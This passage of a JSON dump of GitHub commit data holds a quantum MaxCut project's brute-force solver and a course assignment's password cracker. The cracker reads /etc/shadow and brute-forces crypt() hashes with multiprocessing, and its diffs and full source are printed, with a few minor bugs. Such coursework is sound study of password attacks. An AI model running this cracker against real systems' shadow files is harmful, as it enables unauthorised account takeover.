equations = zero + first@array\n\n                y = np.array([equations[_] for _ in range(self.number_of_parameters)])\n                return y@y\n\n\n            def minim_eig_constraint(x):\n                new_thetas = [optimal_thetas[i] + x[i] for i in range(self.number_of_parameters)]\n                return self.minimum_eigenvalue(self.get_hessian_matrix(hamiltonian, new_thetas))\n\n            cons = [{'type': 'ineq', 'fun':minim_eig_constraint}]\n            res = optimize.minimize(equations, x0 = [0 for _ in range(self.number_of_parameters)], constraints=cons,  method='COBYLA',  options={'disp': True, 'maxiter':700}) \n            epsilons = [res.x[_] for _ in range(self.number_of_parameters)]\n            \n            \n            print(f'The solutions of equations are {epsilons}')\n            optimal_thetas = [optimal_thetas[_] + epsilons[_] for _ in range(self.number_of_parameters)]\n\n            hessian = self.get_hessian_matrix(hamiltonian, optimal_thetas)\n            min_eigen = self.minimum_eigenvalue(hessian)\n\n\n            inst_exp_value = self.get_expectation_value(optimal_thetas, hamiltonian) #- lamda*offset\n            energies_aqcpqc.append(inst_exp_value)\n\n            print(f'and the minimum eigenvalue of the Hessian at the solution is {min_eigen}')\n            print(f'and the instantaneous expectation values is {inst_exp_value}')\n\n        return energies_aqcpqc\n\n\n\n'''\ndef best_cost_brute(adjacency_matrix): #This function calculates the optimal cost function by brute force\n    best_cost = 0\n    number_of_qubits = len(adjacency_matrix)\n    best_string = 0\n    costs = collections.defaultdict(list)\n    for b in range(2**number_of_qubits):\n        x = [int(t) for t in reversed(list(bin(b)[2:].zfill(number_of_qubits)))]\n        cost = 0\n        for i in range(number_of_qubits):\n            for j in range(number_of_qubits):\n                cost += adjacency_matrix[i,j] * x[i] * (1-x[j])\n\n        cost = np.round(cost,5)\n        x.reverse()\n        costs[cost].append(x)\n\n        if best_cost < cost:\n            best_cost = cost\n            best_string = x\n\n    costs = sorted(costs.items())\n    return best_cost, best_string, costs\n\n\nbest_cost, best_string, costs = best_cost_brute(w)\nprint(costs)\nprint(f'For the given instance the optimal cost is {best_cost} and the bitstrings corresponding to that are {costs[-1][1]}')\n\n\n\n\n\n\ndef get_offset(number_of_qubits, adjacency_matrix): #The offset (constant part of the Hamiltonian) for a general graph.\n    offset = 0\n    for i in range(number_of_qubits):\n        for j in range(number_of_qubits):\n            if i<j:\n                offset += adjacency_matrix[i,j]\/2\n    return offset\n\n\ndef minimum_instantaneous(time): #This gives the minimum energy at a given time.\n    hamil = calculate_instantaneous_hamiltonian(time)\n    eigenvalues, v1 = np.linalg.eig(hamil)\n    min_eig = np.min(eigenvalues) - time*offset\n    return np.real(min_eig)\n\n\ndef calculate_spectrum(steps, plot=True):\n    gs_energies = []\n    first_excited_energies = []\n    ener1, ener2, ener3, ener4, ener5, ener6, ener7, ener8, ener9, ener10 = [],[],[],[],[],[],[],[],[],[]\n    for step in range(steps+1):\n        hamiltonian = calculate_instantaneous_hamiltonian(step\/steps)\n        q, v = np.linalg.eigh(hamiltonian)\n        q = sorted(q)\n        gs_energy = q[0]\n        en1, en2, en3, en4, en5, en6, en7, en8, en9, en10 = q[1], q[2], q[3], q[4], q[5], q[6], q[7], q[8], q[9], q[10]\n        for k in range(len(q)):\n            if np.round(q[k], 5) != np.round(gs_energy, 5):\n                break\n        first_excited_energy = q[k+1]\n\n        ener1.append(en1-(step\/steps)*offset)\n        ener2.append(en2-(step\/steps)*offset)\n        ener3.append(en3-(step\/steps)*offset)\n        ener4.append(en4-(step\/steps)*offset)\n        ener5.append(en5-(step\/steps)*offset)\n        ener6.append(en6-(step\/steps)*offset)\n        ener7.append(en7-(step\/steps)*offset)\n        ener8.append(en8-(step\/steps)*offset)\n        ener9.append(en9-(step\/steps)*offset)\n        ener10.append(en10-(step\/steps)*offset)\n        gs_energies.append(gs_energy-(step\/steps)*offset)\n        first_excited_energies.append(first_excited_energy-(step\/steps)*offset)\n    \n    time = [step\/steps for step in range(steps+1)]\n    if plot == True:\n        plt.plot(time, gs_energies, label='Ground State energy')\n        #plt.plot(time, first_excited_energies, label='First Excited energy')\n        plt.plot(time, ener1, label='energy1')\n        plt.plot(time, ener2, label='energy2')\n        plt.plot(time, ener3, label='energy3')\n        plt.plot(time, ener4, label='energy4')\n        plt.plot(time, ener5, label='energy5')\n        plt.plot(time, ener6, label='energy6')\n        plt.plot(time, ener7, label='energy7')\n        plt.plot(time, ener8, label='energy8')\n        plt.plot(time, ener9, label='energy9')\n        plt.plot(time, ener10, label='energy10')\n        plt.legend(fontsize=14)\n        plt.show()\n\n    return gs_energies, first_excited_energies, ener1, ener2, ener3, ener4, ener5, ener6, ener7, ener8, ener9, ener10\n\ngs_energies, first_excited_energies, ener1, ener2, ener3, ener4, ener5, ener6, ener7, ener8, ener9, ener10 = calculate_spectrum(steps)\n\nprint(gs_energies)\nprint(first_excited_energies)\n\n#We must first calculate the linear system of equations.\n\n\n\n\n#energies_aqqpqc_0_layer = [-6, -5.950000000000003, -5.900000000000002, -5.850000000000002, -5.8000000000000025, -5.7500000000000036, -5.700000000000003, -5.650000000000001, -5.600000000000002, -5.550000000000001, -5.500000000000002, -5.450000000000001, -5.400000000000001, -5.3675997603859695, -5.364692179604818, -5.384587040477438, -5.422425754662893, -5.474606432222031, -5.538409853965691, -5.611749378717045, -5.693000478625443, -5.7808807382792455, -5.874366420370951, -5.972630885535981, -6.074999988470246, -6.180918998637066, -6.289927529343797, -6.4016404219777945, -6.515733524828797, -6.631939774461214, -6.750003297851241, -6.750003297851241]\n#energies_aqcpcq_1_layer = [-6, -5.950154451422959, -5.900752501028443, -5.851599417473611, -5.802810275859583, -5.756143421395298, -5.709640388324241, -5.663747298479056, -5.6187162302062434, -5.574728252892157, -5.532062018486879, -5.490699606453825, -5.4512718237156585, -5.416590678447584, -5.406928300964287, -5.4322567770114425, -5.483743933815743, -5.549963067454288, -5.637808125319982, -5.956258904387567, -6.333491366547241, -6.557759368393276, -6.794265208191857, -7.042191120246468, -7.3000746636667655, -7.56669758357127, -7.841036517600447, -8.12222509218769, -8.40952415147253, -8.702298821715617, -8.999999951495681, -8.999999951495681]\n#energies_aqcpqc_2_layer = [-6, -5.950157261263083, -5.9014846312192635, -5.853497145472425, -5.80647272674259, -5.760501715222631, -5.715656725992175, -5.672441082806816, -5.630451764696526, -5.5945951732748735, -5.5570613522160475, -5.523330193226521, -5.489608225137747, -5.458743939422438, -5.457445871024463, -5.501311014037389, -5.571978192624387, -5.754371140922796, -5.933836080865668, -6.125010180756819, -6.333488907412294, -6.557177612912261, -6.7939464214127, -7.042026695042157, -7.299997078302127, -7.566666313970032, -7.84102539186039, -8.122222076713062, -8.409523724866252, -8.7022987886861, -8.99999998178523, -8.99999998178523]\n#energies_aqcpqc_3_layer = []\n'''"},"\/main.py":{"changes":[{"diff":"\n from hamiltonian import Hamiltonian \n from quantum_circuit import QCir\n import networkx as nx\n+from brute_force import Brute_Force\n \n \n-seed = 1\n-number_of_qubits = 4\n+seed = 2\n+number_of_qubits = 6\n steps = 30 #Choose number of steps to interpolate from initial to final Hamiltonian\n connectivity = 'nearest-neighbors' #This is the connectivity of the non-parameterized gates in the Hardware Efficient ansatz\n single_qubit_gates = 'ry'\n","add":3,"remove":2,"filename":"\/main.py","badparts":["seed = 1","number_of_qubits = 4"],"goodparts":["from brute_force import Brute_Force","seed = 2","number_of_qubits = 6"]},{"diff":" layers = 1\n entanglement = 'linear'\n \n-graph = nx.random_regular_graph(3, number_of_qubits, seed=1)\n+graph = nx.random_regular_graph(3, number_of_qubits, seed=seed)\n w = nx.to_numpy_matrix(graph, nodelist=sorted(graph.nodes()))\n \n problem = {'type':'MaxCut', 'properties': w}\n \n+Brute_Force(problem)\n+\n \n aqc_pqc = AQC_PQC(number_of_qubits, problem, steps, layers, single_qubit_gates, entanglement_gates, entanglement)\n aqc_pqc.run()\n\\ No newline at end of file\n","add":3,"remove":1,"filename":"\/main.py","badparts":["graph = nx.random_regular_graph(3, number_of_qubits, seed=1)"],"goodparts":["graph = nx.random_regular_graph(3, number_of_qubits, seed=seed)","Brute_Force(problem)"]}],"source":"\nfrom aqc_pqc import AQC_PQC from hamiltonian import Hamiltonian from quantum_circuit import QCir import networkx as nx seed=1 number_of_qubits=4 steps=30 connectivity='nearest-neighbors' single_qubit_gates='ry' entanglement_gates='cz' layers=1 entanglement='linear' graph=nx.random_regular_graph(3, number_of_qubits, seed=1) w=nx.to_numpy_matrix(graph, nodelist=sorted(graph.nodes())) problem={'type':'MaxCut', 'properties': w} aqc_pqc=AQC_PQC(number_of_qubits, problem, steps, layers, single_qubit_gates, entanglement_gates, entanglement) aqc_pqc.run() ","sourceWithComments":"from aqc_pqc import AQC_PQC\nfrom hamiltonian import Hamiltonian \nfrom quantum_circuit import QCir\nimport networkx as nx\n\n\nseed = 1\nnumber_of_qubits = 4\nsteps = 30 #Choose number of steps to interpolate from initial to final Hamiltonian\nconnectivity = 'nearest-neighbors' #This is the connectivity of the non-parameterized gates in the Hardware Efficient ansatz\nsingle_qubit_gates = 'ry'\nentanglement_gates = 'cz'\nlayers = 1\nentanglement = 'linear'\n\ngraph = nx.random_regular_graph(3, number_of_qubits, seed=1)\nw = nx.to_numpy_matrix(graph, nodelist=sorted(graph.nodes()))\n\nproblem = {'type':'MaxCut', 'properties': w}\n\n\naqc_pqc = AQC_PQC(number_of_qubits, problem, steps, layers, single_qubit_gates, entanglement_gates, entanglement)\naqc_pqc.run()"}},"msg":"added brute force and minor changes"}},"https:\/\/github.com\/johnny-hui\/COMP_8005_assignment2":{"e6073ccb4feea1164cd78e93007f93cd38f76c47":{"url":"https:\/\/api.github.com\/repos\/johnny-hui\/COMP_8005_assignment2\/commits\/e6073ccb4feea1164cd78e93007f93cd38f76c47","html_url":"https:\/\/github.com\/johnny-hui\/COMP_8005_assignment2\/commit\/e6073ccb4feea1164cd78e93007f93cd38f76c47","message":"Changed Brute Force to multi-processing","sha":"e6073ccb4feea1164cd78e93007f93cd38f76c47","keyword":"brute force change","diff":"diff --git a\/Cracker.py b\/Cracker.py\nindex f386d5e..34262e9 100644\n--- a\/Cracker.py\n+++ b\/Cracker.py\n@@ -1,6 +1,7 @@\n import crypt\n import itertools\n-import queue\n+import multiprocessing\n+from multiprocessing import Queue\n import time\n from collections import deque\n import numpy as np\n@@ -25,7 +26,7 @@ def create_char_chunk_index_list(num_of_threads: int):\n     chunk_list = np.array_split(characters_map, num_of_threads)\n \n     for chunk in chunk_list:\n-        for letter in characters_map:\n+        for letter in characters_map[counter:]:\n             if chunk[0] == letter:\n                 chunk_index.append(counter)\n                 break\n@@ -58,9 +59,15 @@ def brute_force(salt, user_hash, max_attempts):\n \n # HYPOTHESIS: Heavily Compute-Bound Functions in Multi-threading will result in decrease performance\n # Threads operate in parallel; this - the CPU has to maintain the original workload for each thread.\n-def brute_force_multithread(salt, user_hash, max_attempts, thread_id: int, index_start: int, bf_pw_deque: deque,\n-                            bf_total_time_q: queue.Queue, bf_total_attempt_q: queue.Queue, bf_pw_lock: threading.Lock,\n-                            bf_time_lock: threading.Lock, bf_attempt_lock: threading.Lock):\n+def brute_force_multithread(salt, user_hash, max_attempts,\n+                            thread_id: int,\n+                            index_start: int,\n+                            bf_pw_deque: multiprocessing.Queue,\n+                            bf_total_time_q: multiprocessing.Queue,\n+                            bf_total_attempt_q: multiprocessing.Queue,\n+                            bf_pw_lock: threading.Lock,\n+                            bf_time_lock: threading.Lock,\n+                            bf_attempt_lock: threading.Lock):\n     # Print to specify which starting index\n     print(f\"[+] [Thread {thread_id}] - Starting guess at the following character: {characters_map[index_start]}\")\n \n@@ -73,8 +80,9 @@ def brute_force_multithread(salt, user_hash, max_attempts, thread_id: int, index\n             attempts += 1\n \n             # SIGNAL - Check if password is found\n-            if len(bf_pw_deque) is not ZERO:\n-                for pw in bf_pw_deque:\n+            if not bf_pw_deque.empty():\n+                while True:\n+                    pw = bf_pw_deque.get()\n                     if pw is not None:\n                         total_time = (time.process_time() - s_time)\n                         _put_in_queue(attempts, bf_attempt_lock, bf_total_attempt_q)\n@@ -123,9 +131,9 @@ def brute_force_multithread(salt, user_hash, max_attempts, thread_id: int, index\n     _put_in_deque(password, bf_pw_lock, bf_pw_deque)\n \n \n-def _put_in_deque(x, lock, some_deque: deque):\n+def _put_in_deque(x, lock, some_deque: multiprocessing.Manager().Queue()):\n     lock.acquire()\n-    some_deque.append(x)\n+    some_deque.put(x)\n     lock.release()\n \n \ndiff --git a\/__pycache__\/Algorithms.cpython-311.pyc b\/__pycache__\/Algorithms.cpython-311.pyc\nindex 0e02a44..d8ffb18 100644\nBinary files a\/__pycache__\/Algorithms.cpython-311.pyc and b\/__pycache__\/Algorithms.cpython-311.pyc differ\ndiff --git a\/__pycache__\/Cracker.cpython-311.pyc b\/__pycache__\/Cracker.cpython-311.pyc\nindex fb74973..23d50ff 100644\nBinary files a\/__pycache__\/Cracker.cpython-311.pyc and b\/__pycache__\/Cracker.cpython-311.pyc differ\ndiff --git a\/__pycache__\/constants.cpython-311.pyc b\/__pycache__\/constants.cpython-311.pyc\nindex f4247d5..26d6f18 100644\nBinary files a\/__pycache__\/constants.cpython-311.pyc and b\/__pycache__\/constants.cpython-311.pyc differ\ndiff --git a\/constants.py b\/constants.py\nindex 17f7002..0fa0885 100644\n--- a\/constants.py\n+++ b\/constants.py\n@@ -9,3 +9,6 @@\n BRUTE_FORCE_LAUNCH = True\n PROGRAM_TERMINATE_MSG_1 = \"[+] All users have been processed!\"\n PROGRAM_TERMINATE_MSG_2 = \"[+] PROGRAM_EXIT: Now terminating program...\"\n+BOLD_START = \"\\033[1m\"\n+BOLD_END = \"\\033[0;0m\"\n+\ndiff --git a\/main.py b\/main.py\nindex 76313f5..89f6212 100644\n--- a\/main.py\n+++ b\/main.py\n@@ -1,11 +1,14 @@\n import queue\n+import signal\n from concurrent.futures import ThreadPoolExecutor\n+from multiprocessing import Process\n import Algorithms\n-from collections import deque\n import cpuinfo\n+\n+import constants\n from constants import WELCOME_MSG, WELCOME_DECORATION, DICTIONARY_ATK_MSG, ZERO, TWO, BACK_TO_START, BRUTE_FORCE_LAUNCH, \\\n     PROGRAM_TERMINATE_MSG_1, PROGRAM_TERMINATE_MSG_2\n-from Cracker import brute_force_multithread, create_char_chunk_index_list, BRUTE_FORCE_ATK_MSG\n+from Cracker import *\n import crypt\n import getopt\n import multiprocessing\n@@ -14,6 +17,7 @@\n import time\n import threading\n \n+\n def _algorithm_not_found():\n     print(\"[+] ALGORITHM_NOT_FOUND_ERROR: This algorithm type is not supported!\")\n     print(\"[+] Now checking for next user...\")\n@@ -239,36 +243,6 @@ def display_welcome_msg():\n     print(f\"[+] Number of Cores Available: {multiprocessing.cpu_count()}\")\n \n \n-def init_variables():\n-    brute_force_attempts = ZERO\n-    brute_force_flag = False\n-    thread_total_attempts = ZERO\n-    total_brute_force_attempts = ZERO\n-    total_attempts = ZERO\n-    total_attempt_lock = threading.Lock()\n-    total_thread_time = ZERO\n-    total_thread_time_lck = threading.Lock()\n-    brute_force_counter_lock = threading.Lock()\n-    brute_force_counter = ZERO\n-    password = \"\"\n-    start_time = ZERO\n-    stop_time = ZERO\n-    total_time = ZERO\n-    pw_list_lock = threading.Lock()\n-    pw_queue = queue.Queue()\n-    pw_lck = threading.Lock()\n-    bf_pw_deque = deque()\n-    bf_total_time_queue = queue.Queue()\n-    bf_total_attempt_queue = queue.Queue()\n-    bf_total_thread_time = ZERO\n-    bf_total_thread_attempts = ZERO\n-\n-    return total_attempts, brute_force_attempts, total_brute_force_attempts, thread_total_attempts, brute_force_flag, \\\n-        start_time, stop_time, total_time, password, pw_list_lock, total_attempt_lock, pw_queue, pw_lck, \\\n-        total_thread_time, total_thread_time_lck, brute_force_counter_lock, brute_force_counter, bf_pw_deque,\\\n-        bf_total_time_queue, bf_total_attempt_queue, bf_total_thread_time, bf_total_thread_attempts\n-\n-\n def make_pw_deque(pw_list_dir):\n     global brute_force_flag\n \n@@ -367,18 +341,18 @@ def _print_results(elapsed_time, d_thread_attempts, d_thread_time):\n         print(f\"[+] Total Thread Attempts (Dictionary Attack): {d_thread_attempts}\")\n         print(f\"[+] Total Thread Time: {round(d_thread_time, 3)} seconds\")\n \n-    print(f\"[+] Time elapsed: {elapsed_time} seconds\")\n+    # print(f\"[+] Time elapsed: {elapsed_time} seconds\")\n \n \n def process_statistics(pw):\n     global stop_time, total_time, dictionary_thread_total_attempts, dictionary_total_thread_time\n \n-    stop_time = time.process_time()\n-    _print_results(round(stop_time - start_time, 2), dictionary_thread_total_attempts, dictionary_total_thread_time)\n+    stop_time = time.perf_counter()\n     total_time += (stop_time - start_time)\n+    _print_results(round(total_time, 2), dictionary_thread_total_attempts, dictionary_total_thread_time)\n \n     if pw != \"\":\n-        print(f\"[+] The password is {pw}\")\n+        print(f\"[+] The password is {constants.BOLD_START}{pw}{constants.BOLD_END}\")\n \n \n def _remove_duplicate_users(cleansed_user_list_args, orig_user_list_args):\n@@ -397,9 +371,10 @@ def remove_user_from_list(user_list):\n def reset_variables():\n     global start_time, password, dictionary_thread_total_attempts, \\\n         dictionary_total_thread_time, brute_force_counter, pw_deque, \\\n-        bf_pw_deque, bf_total_time_queue, bf_total_attempt_queue, bf_total_thread_time\n+        bf_pw_deque, bf_total_time_queue, bf_total_attempt_queue, bf_total_thread_time, \\\n+        processes\n \n-    start_time = time.process_time()\n+    start_time = time.perf_counter()\n     password = None\n     shadow_file.seek(BACK_TO_START)\n     dictionary_thread_total_attempts = ZERO\n@@ -408,9 +383,10 @@ def reset_variables():\n     bf_total_thread_time = ZERO\n     pw_deque = backup_deque.copy()\n     pw_queue.empty()\n-    bf_pw_deque.clear()\n+    bf_pw_deque.empty()\n     bf_total_time_queue.empty()\n     bf_total_attempt_queue.empty()\n+    processes.clear()\n \n \n def user_not_found_check(user_info, user_list, user_name, file_dir):\n@@ -432,25 +408,47 @@ def init_bf_variables():\n     return start_index_list, bf_pw_lock, bf_total_time_lock, bf_total_attempt_lock\n \n \n-def bf_pw_results_check():\n+def bf_pw_results_check(process_list: list[multiprocessing.Process]):\n     global password, bf_pw_deque, num_of_threads\n \n-    while len(bf_pw_deque) != num_of_threads:\n+    while bf_pw_deque.qsize() != num_of_threads:\n         break\n \n-    for item in bf_pw_deque:\n+    while True:  # CONSTRAINT: Since processes end so fast, wait 3 seconds before killing each process.\n+        item = bf_pw_deque.get()\n         if item is not None:\n+            for process in process_list:\n+                time.sleep(3)\n+                os.kill(process.pid, signal.SIGKILL)\n             password = item\n+            break\n \n \n # Main Program\n if __name__ == \"__main__\":\n     # Declare Variables\n-    total_attempts, brute_force_attempts, total_brute_force_attempts, dictionary_thread_total_attempts, \\\n-        brute_force_flag, start_time, stop_time, total_time, password, pw_list_lock, \\\n-        total_attempt_lock, pw_queue, pw_lck, dictionary_total_thread_time, total_thread_time_lck,\\\n-        brute_force_counter_lock, brute_force_counter, bf_pw_deque, bf_total_time_queue, \\\n-        bf_total_attempt_queue, bf_total_thread_time, bf_total_thread_attempts = init_variables()\n+    brute_force_attempts = ZERO\n+    brute_force_flag = False\n+    thread_total_attempts = ZERO\n+    total_brute_force_attempts = ZERO\n+    total_attempts = ZERO\n+    total_attempt_lock = threading.Lock()\n+    total_thread_time = ZERO\n+    total_thread_time_lck = threading.Lock()\n+    brute_force_counter_lock = threading.Lock()\n+    brute_force_counter = ZERO\n+    password = \"\"\n+    start_time = ZERO  # Time (main) gets suspended when entering a process\n+    stop_time = ZERO\n+    total_time = ZERO\n+    pw_list_lock = threading.Lock()\n+    pw_queue = Queue()\n+    pw_lck = threading.Lock()\n+    bf_pw_deque = Queue()\n+    bf_total_time_queue = Queue()\n+    bf_total_attempt_queue = Queue()\n+    bf_total_thread_time = ZERO\n+    bf_total_thread_attempts = ZERO\n \n     # Initialize Program\n     display_welcome_msg()\n@@ -465,6 +463,9 @@ def bf_pw_results_check():\n     # Read contents of the \/etc\/shadow\n     shadow_file = open_shadow_file(file_directory)\n \n+    # Process Array\n+    processes = []\n+\n     # Check if users exist and handle each\n     for user in user_list_args:\n         selected_user_info = \"\"\n@@ -503,21 +504,20 @@ def bf_pw_results_check():\n                     print(BRUTE_FORCE_ATK_MSG)\n                     start_index_list, bf_pw_lock, bf_total_time_lock, bf_total_attempt_lock = init_bf_variables()\n \n-                    with ThreadPoolExecutor() as executor:\n-                        thread_id = 1\n-                        for index in range(len(start_index_list)):\n-                            executor.submit(brute_force_multithread, salt, user_hash, max_attempts, thread_id,\n-                                            start_index_list[index], bf_pw_deque, bf_total_time_queue,\n-                                            bf_total_attempt_queue, bf_pw_lock, bf_total_time_lock,\n-                                            bf_total_attempt_lock)\n-                            thread_id += 1\n-\n-                    # WHILE LOOP for password\n-                    bf_pw_results_check()\n-\n-                    # WHILE LOOP (TIME) to wait for length of time queue to be equal to total number of threads\n-                    while bf_total_time_queue.qsize() != num_of_threads:\n-                        break\n+                    thread_id = 1\n+                    for index in range(len(start_index_list)):\n+                        proc = Process(target=brute_force_multithread, args=(salt, user_hash, max_attempts, thread_id,\n+                                                                             start_index_list[index], bf_pw_deque,\n+                                                                             bf_total_time_queue,\n+                                                                             bf_total_attempt_queue, bf_pw_lock,\n+                                                                             bf_total_time_lock,\n+                                                                             bf_total_attempt_lock))\n+                        thread_id += 1\n+                        processes.append(proc)\n+                        proc.start()\n+\n+                    # Wait until password has been found\n+                    bf_pw_results_check(processes)\n \n                     for i in range(bf_total_time_queue.qsize()):\n                         bf_total_thread_time += bf_total_time_queue.get()\n","files":{"\/Cracker.py":{"changes":[{"diff":"\n import crypt\n import itertools\n-import queue\n+import multiprocessing\n+from multiprocessing import Queue\n import time\n from collections import deque\n import numpy as np\n","add":2,"remove":1,"filename":"\/Cracker.py","badparts":["import queue"],"goodparts":["import multiprocessing","from multiprocessing import Queue"]},{"diff":"\n     chunk_list = np.array_split(characters_map, num_of_threads)\n \n     for chunk in chunk_list:\n-        for letter in characters_map:\n+        for letter in characters_map[counter:]:\n             if chunk[0] == letter:\n                 chunk_index.append(counter)\n                 break\n","add":1,"remove":1,"filename":"\/Cracker.py","badparts":["        for letter in characters_map:"],"goodparts":["        for letter in characters_map[counter:]:"]},{"diff":"\n \n # HYPOTHESIS: Heavily Compute-Bound Functions in Multi-threading will result in decrease performance\n # Threads operate in parallel; this - the CPU has to maintain the original workload for each thread.\n-def brute_force_multithread(salt, user_hash, max_attempts, thread_id: int, index_start: int, bf_pw_deque: deque,\n-                            bf_total_time_q: queue.Queue, bf_total_attempt_q: queue.Queue, bf_pw_lock: threading.Lock,\n-                            bf_time_lock: threading.Lock, bf_attempt_lock: threading.Lock):\n+def brute_force_multithread(salt, user_hash, max_attempts,\n+                            thread_id: int,\n+                            index_start: int,\n+                            bf_pw_deque: multiprocessing.Queue,\n+                            bf_total_time_q: multiprocessing.Queue,\n+                            bf_total_attempt_q: multiprocessing.Queue,\n+                            bf_pw_lock: threading.Lock,\n+                            bf_time_lock: threading.Lock,\n+                            bf_attempt_lock: threading.Lock):\n     # Print to specify which starting index\n     print(f\"[+] [Thread {thread_id}] - Starting guess at the following character: {characters_map[index_start]}\")\n \n","add":9,"remove":3,"filename":"\/Cracker.py","badparts":["def brute_force_multithread(salt, user_hash, max_attempts, thread_id: int, index_start: int, bf_pw_deque: deque,","                            bf_total_time_q: queue.Queue, bf_total_attempt_q: queue.Queue, bf_pw_lock: threading.Lock,","                            bf_time_lock: threading.Lock, bf_attempt_lock: threading.Lock):"],"goodparts":["def brute_force_multithread(salt, user_hash, max_attempts,","                            thread_id: int,","                            index_start: int,","                            bf_pw_deque: multiprocessing.Queue,","                            bf_total_time_q: multiprocessing.Queue,","                            bf_total_attempt_q: multiprocessing.Queue,","                            bf_pw_lock: threading.Lock,","                            bf_time_lock: threading.Lock,","                            bf_attempt_lock: threading.Lock):"]},{"diff":"\n             attempts += 1\n \n             # SIGNAL - Check if password is found\n-            if len(bf_pw_deque) is not ZERO:\n-                for pw in bf_pw_deque:\n+            if not bf_pw_deque.empty():\n+                while True:\n+                    pw = bf_pw_deque.get()\n                     if pw is not None:\n                         total_time = (time.process_time() - s_time)\n                         _put_in_queue(attempts, bf_attempt_lock, bf_total_attempt_q)\n","add":3,"remove":2,"filename":"\/Cracker.py","badparts":["            if len(bf_pw_deque) is not ZERO:","                for pw in bf_pw_deque:"],"goodparts":["            if not bf_pw_deque.empty():","                while True:","                    pw = bf_pw_deque.get()"]},{"diff":"\n     _put_in_deque(password, bf_pw_lock, bf_pw_deque)\n \n \n-def _put_in_deque(x, lock, some_deque: deque):\n+def _put_in_deque(x, lock, some_deque: multiprocessing.Manager().Queue()):\n     lock.acquire()\n-    some_deque.append(x)\n+    some_deque.put(x)\n     lock.release()\n \n ","add":2,"remove":2,"filename":"\/Cracker.py","badparts":["def _put_in_deque(x, lock, some_deque: deque):","    some_deque.append(x)"],"goodparts":["def _put_in_deque(x, lock, some_deque: multiprocessing.Manager().Queue()):","    some_deque.put(x)"]}],"source":"\nimport crypt import itertools import queue import time from collections import deque import numpy as np import threading ZERO=0 START_LENGTH=1 MAX_CHAR_LENGTH=9999 BRUTE_FORCE_ATK_MSG=\"[+][ATTACK 2]: Now launching a Brute Force Attack. Please wait...\" characters_map=('!', '@', ' ',', '<', '>', ':', ':', '{', '}', '[', ']', '|', '\"', '\\'', '?', '~', '`', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ' ') def create_char_chunk_index_list(num_of_threads: int): counter=ZERO chunk_index=[] chunk_list=np.array_split(characters_map, num_of_threads) for chunk in chunk_list: for letter in characters_map: if chunk[0]==letter: chunk_index.append(counter) break counter +=1 return chunk_index def brute_force(salt, user_hash, max_attempts): print(BRUTE_FORCE_ATK_MSG) attempts=ZERO for length in range(START_LENGTH, MAX_CHAR_LENGTH): for guess in itertools.product(characters_map, repeat=length): attempts +=1 password=''.join(guess) if crypt.crypt(password, salt)==user_hash: print(f\"[+] CRACK COMPLETE: Password has been found!\") print(f\"[+] Number of Attempts Made:{attempts}\") return password, attempts if attempts==max_attempts: print(f\"[+] CRACK FAILED: Max attempts of{max_attempts} has been reached!\") password=None return password, attempts def brute_force_multithread(salt, user_hash, max_attempts, thread_id: int, index_start: int, bf_pw_deque: deque, bf_total_time_q: queue.Queue, bf_total_attempt_q: queue.Queue, bf_pw_lock: threading.Lock, bf_time_lock: threading.Lock, bf_attempt_lock: threading.Lock): print(f\"[+][Thread{thread_id}] -Starting guess at the following character:{characters_map[index_start]}\") s_time=time.process_time() attempts=ZERO for length in range(START_LENGTH, MAX_CHAR_LENGTH): for guess in itertools.product(characters_map[index_start:], repeat=length): attempts +=1 if len(bf_pw_deque) is not ZERO: for pw in bf_pw_deque: if pw is not None: total_time=(time.process_time() -s_time) _put_in_queue(attempts, bf_attempt_lock, bf_total_attempt_q) _put_in_queue(total_time, bf_time_lock, bf_total_time_q) print(f\"[+][Thread{thread_id}] Number of Attempts Made:{attempts}\") print(f\"[+][Thread{thread_id}] Time:{total_time} seconds\") print(f\"[+][Thread{thread_id}] -PW FOUND: Now Terminating...\") return None password=''.join(guess) if crypt.crypt(password, salt)==user_hash: total_time=(time.process_time() -s_time) print(f\"[+][PW Thread{thread_id}] CRACK COMPLETE: Password has been found!\") print(f\"[+][PW Thread{thread_id}] Number of Attempts Made:{attempts}\") print(f\"[+][PW Thread{thread_id}] Time:{total_time} seconds\") _put_in_queue(attempts, bf_attempt_lock, bf_total_attempt_q) _put_in_queue(total_time, bf_time_lock, bf_total_time_q) _put_in_deque(password, bf_pw_lock, bf_pw_deque) return password, attempts if attempts==max_attempts: total_time=(time.process_time() -s_time) print(f\"[+][Thread{thread_id}] CRACK FAILED: Max attempts of{max_attempts} has been reached!\") print(f\"[+][Thread{thread_id}] Time:{total_time} seconds\") password=None _put_in_queue(attempts, bf_attempt_lock, bf_total_attempt_q) _put_in_queue(total_time, bf_time_lock, bf_total_time_q) _put_in_deque(password, bf_pw_lock, bf_pw_deque) return password, attempts total_time=(time.process_time() -s_time) password=None _put_in_queue(attempts, bf_attempt_lock, bf_total_attempt_q) _put_in_queue(total_time, bf_time_lock, bf_total_time_q) _put_in_deque(password, bf_pw_lock, bf_pw_deque) def _put_in_deque(x, lock, some_deque: deque): lock.acquire() some_deque.append(x) lock.release() def _put_in_queue(x, lock, some_queue): lock.acquire() some_queue.put(x) lock.release() ","sourceWithComments":"import crypt\nimport itertools\nimport queue\nimport time\nfrom collections import deque\nimport numpy as np\nimport threading\n\nZERO = 0\nSTART_LENGTH = 1\nMAX_CHAR_LENGTH = 9999\nBRUTE_FORCE_ATK_MSG = \"[+] [ATTACK 2]: Now launching a Brute Force Attack. Please wait...\"\ncharacters_map = ('!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '=', \"'\\'\", '\/', '.',\n                  ',', '<', '>', ':', ':', '{', '}', '[', ']', '|', '\"', '\\'', '?', '~', '`',\n                  '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f',\n                  'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n                  'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',\n                  'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 